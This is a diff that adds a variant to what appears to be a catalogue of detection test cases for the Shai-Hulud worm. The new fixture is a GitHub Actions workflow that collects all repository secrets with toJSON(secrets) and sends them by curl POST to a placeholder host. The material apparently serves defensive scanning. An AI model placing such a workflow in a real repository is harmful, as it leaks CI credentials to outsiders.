@@ -46,6 +46,17 @@ not_covered: >
   happen at run time and are not visible as patterns in a repository.
 
 variants:
+  - id: all-secrets-to-custom-url
+    technique: A network command consumes the all-secrets value at a non-catcher placeholder host.
+    files:
+      .github/workflows/shai-hulud-workflow.yml: |
+        on: push
+        jobs:
+          process:
+            steps:
+              - env:
+                  CONTENTS: ${{ toJSON(secrets) }}
+                run: curl -X POST -d "$CONTENTS" https://example.invalid/u
   - id: curl-in-run
     technique: The workflow step sends the secrets with curl inside run instead of env.
     files:
